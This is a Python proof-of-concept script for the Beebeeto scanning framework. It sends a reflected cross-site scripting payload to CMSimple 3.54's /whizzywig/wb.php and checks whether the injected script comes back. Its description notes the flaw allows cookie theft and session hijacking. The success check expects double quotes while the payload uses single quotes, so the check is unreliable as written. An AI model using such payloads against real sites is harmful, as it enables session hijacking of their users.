#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0190',
            'name': 'CMSimple 3.54 /whizzywig/wb.php XSS漏洞 POC',
            'author': '我只会打连连看',
            'create_date': '2014-12-09',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'CMSimple',
            'vul_version': ['3.54'],
            'type': 'Cross Site Scripting',
            'tag': ['CMSimple漏洞', 'xss漏洞', '/whizzywig/wb.php', 'php'],
            'desc': '''
                    漏洞文件：Getarticle.CMSimple不正确过滤传递给"/whizzywig/wb.php"脚本的"d" HTTP GET参数数据，
                    允许攻击者构建恶意URI，诱使用户解析，可获得敏感Cookie，劫持会话或在客户端上进行恶意操作。
                    ''',
            'references': ['http://sebug.net/vuldb/ssvid-61903',
            ],
        },
    }

   
    @classmethod
    def verify(cls, args):
        payload = '/whizzywig/wb.php?d=%27%3E%3Cscript%3Ealert%28%27bb2%27%29%3C/script%3E'
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if '<script>alert("bb2")</script>' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args
        
    exploit = verify
        
    
if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())